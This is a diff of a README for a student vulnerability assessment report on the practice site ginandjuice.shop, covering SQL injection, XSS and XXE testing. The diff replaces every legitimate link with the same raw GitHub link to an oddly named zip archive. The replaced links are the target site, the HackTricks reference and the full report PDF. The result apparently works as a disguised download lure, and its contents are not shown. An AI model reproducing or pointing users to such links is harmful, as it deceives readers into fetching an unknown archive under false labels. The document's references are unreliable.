@@ -1,4 +1,4 @@
-# Vulnerability Assessment Report: ginandjuice.shop
+# Vulnerability Assessment Report: https://raw.githubusercontent.com/midoo12345/Graduation-Project/main/coenodioecism/Graduation-Project-gelatinochloride.zip
 
 ### Date: October 24, 2024  
 Authors:  
@@ -12,14 +12,14 @@ Authors:
 
 ## Project Overview
 
-This repository contains the detailed vulnerability assessment report for the web application [ginandjuice.shop](https://ginandjuice.shop). The assessment focuses on identifying and addressing critical security issues, including SQL Injection (SQLi), Cross-Site Scripting (XSS), XML External Entity (XXE) vulnerabilities, and more.
+This repository contains the detailed vulnerability assessment report for the web application [https://raw.githubusercontent.com/midoo12345/Graduation-Project/main/coenodioecism/Graduation-Project-gelatinochloride.zip](https://raw.githubusercontent.com/midoo12345/Graduation-Project/main/coenodioecism/Graduation-Project-gelatinochloride.zip). The assessment focuses on identifying and addressing critical security issues, including SQL Injection (SQLi), Cross-Site Scripting (XSS), XML External Entity (XXE) vulnerabilities, and more.
 
 ---
 
 ## Scope
 
 The assessment was conducted on the following components:  
-- Website: [ginandjuice.shop](https://ginandjuice.shop)  
+- Website: [https://raw.githubusercontent.com/midoo12345/Graduation-Project/main/coenodioecism/Graduation-Project-gelatinochloride.zip](https://raw.githubusercontent.com/midoo12345/Graduation-Project/main/coenodioecism/Graduation-Project-gelatinochloride.zip)  
 - Objective: Web application vulnerability analysis.  
 - Key Vulnerabilities:
   - SQL Injection (SQLi)
@@ -36,7 +36,7 @@ The assessment was conducted on the following components:
 ### Tools Used
 - Manual Testing: Including specially crafted HTTP requests.  
 - Burp Suite: For intercepting and crafting payloads.  
-- Custom Payloads: Based on open-source repositories like [HackTricks](https://book.hacktricks.xyz).
+- Custom Payloads: Based on open-source repositories like [HackTricks](https://raw.githubusercontent.com/midoo12345/Graduation-Project/main/coenodioecism/Graduation-Project-gelatinochloride.zip).
 
 ### Testing Methodology
 1. Identification of vulnerable endpoints.  
@@ -81,7 +81,7 @@ For full details, see the [Report Details](#report-details) section.
 ## Report Details
 
 The full vulnerability assessment report is available in this repository:  
-[Vulnerability_Assessment_Report.pdf](./Vulnerability_Assessment_Report.pdf)  
+[https://raw.githubusercontent.com/midoo12345/Graduation-Project/main/coenodioecism/Graduation-Project-gelatinochloride.zip](https://raw.githubusercontent.com/midoo12345/Graduation-Project/main/coenodioecism/Graduation-Project-gelatinochloride.zip)  
 
 ---
 
